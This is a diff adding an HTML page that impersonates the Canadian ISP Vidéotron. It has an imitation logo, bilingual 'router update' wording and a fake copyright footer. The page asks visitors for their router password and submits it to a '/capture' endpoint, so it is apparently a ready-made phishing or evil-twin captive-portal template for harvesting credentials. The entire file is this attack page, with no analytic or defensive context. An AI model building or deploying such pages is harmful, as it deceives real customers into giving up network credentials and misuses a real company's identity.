@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mise à jour Vidéotron / Videotron Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23ffc107"/><path d="M30 70 L70 50 L30 30 Z" fill="%23000"/></svg>') no-repeat center center;
+            background-size: cover;
+            opacity: 0.3; /* 70% de transparence */
+            z-index: -1;
+        }
+        .logo {
+            width: 300px;
+            margin: 0 auto 25px auto;
+            display: block;
+        }
+        h1 {
+            font-size: 26px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input[type="submit"] {
+            background-color: #ffc107; /* Jaune Vidéotron */
+            color: #000; /* Lettres noires */
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        input[type="submit"]:hover {
+            background-color: #e0a800; /* Jaune plus foncé au survol */
+        }
+        .footer {
+            font-size: 12px;
+            color: #999;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 270 80" xmlns="http://www.w3.org/2000/svg">
+            <!-- Rectangle jaune avec bordure noire -->
+            <rect x="5" y="5" width="260" height="70" fill="#ffc107" stroke="#000" stroke-width="2" rx="5" ry="5"/>
+            <!-- Texte "Vidéotron" centré -->
+            <text x="135" y="42" font-size="40" font-family="Arial" font-weight="bold" fill="#000" text-anchor="middle">Vidéotron</text>
+            <!-- Texte "A QUEBECOR MEDIA COMPANY" centré -->
+            <text x="135" y="62" font-size="14" font-family="Arial" fill="#000" text-anchor="middle">A QUEBECOR MEDIA COMPANY</text>
+        </svg>
+        <h1>Mise à jour de votre router / Router Update</h1>
+        <p>Veuillez entrer le mot de passe de votre router Vidéotron pour procéder à la mise à jour.<br>Please enter your router password to proceed with the Videotron update.</p>
+        <form action="/capture" method="POST">
+            <input type="password" name="password" placeholder="Mot de passe de votre router / Router Password" required>
+            <input type="submit" value="Connexion / Login">
+        </form>
+        <div class="footer">
+            © 2025 Vidéotron. Tous droits réservés. / All rights reserved.
+        </div>
+    </div>
+</body>
+</html>
